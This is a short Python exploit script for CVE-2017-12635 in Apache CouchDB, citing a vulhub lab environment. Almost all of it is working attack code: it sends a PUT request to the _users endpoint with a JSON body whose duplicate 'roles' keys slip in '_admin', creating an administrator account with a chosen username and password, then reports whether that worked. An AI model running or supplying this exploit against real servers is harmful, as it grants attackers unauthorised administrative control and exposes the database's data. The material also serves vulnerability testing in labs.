#author:九世
#time:2019/2/5
#source:https://vulhub.org/#/environments/couchdb/CVE-2017-12635/
import requests

def cve_2017_12635(urlq,username,password):
    urls=str(urlq).strip()+'/_users/org.couchdb.user:{}'.format(username)
    headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36','Content-Type': 'application/json'}
    payload = '{"type": "user", "name": "'+username
    payload += '", "roles": ["_admin"], "roles": [],'
    payload += '"password": "' + '{}'.format(password)+ '"}'
    print(payload)
    rqt=requests.put(url=urls,headers=headers,data=payload)
    if rqt.status_code==201:
        print('[+] username:{}\n[+] password:{}'.format(username,password))
    elif rqt.status_code==409:
        print('[-] Not Found CVE-2017-12635')
    else:
        print('[-] rqt_status_code:{}'.format(rqt.status_code))